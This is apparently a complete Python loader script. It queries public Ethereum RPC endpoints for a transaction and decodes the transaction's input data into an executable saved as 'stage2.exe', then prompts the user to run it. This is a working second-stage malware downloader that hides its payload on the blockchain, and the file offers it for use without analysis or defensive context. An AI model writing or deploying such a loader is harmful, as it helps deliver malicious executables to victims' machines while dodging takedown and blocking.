import requests

tx_hash = "your-tx-id"


rpc_endpoints = [
    "https://cloudflare-eth.com",
    "https://rpc.ankr.com/eth",
    "https://eth.llamarpc.com",
    "https://eth-rpc.gateway.pokt.network"
]

payload = {
    "jsonrpc": "2.0",
    "method": "eth_getTransactionByHash",
    "params": [tx_hash],
    "id": 1
}

response_data = None

for url in rpc_endpoints:
    try:
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            response_data = response.json()
            if response_data.get('result'):
                break
    except:
        continue

if not response_data or not response_data.get('result'):
    print("Error: Could not fetch transaction from any RPC endpoint.")
    exit(1)


hex_payload = response_data['result']['input'][2:]  # Remove '0x' prefix


payload_bytes = bytes.fromhex(hex_payload)


with open("stage2.exe", "wb") as f:
    f.write(payload_bytes)

print("Download complete. File saved as stage2.exe")
print("Run it manually when ready.")
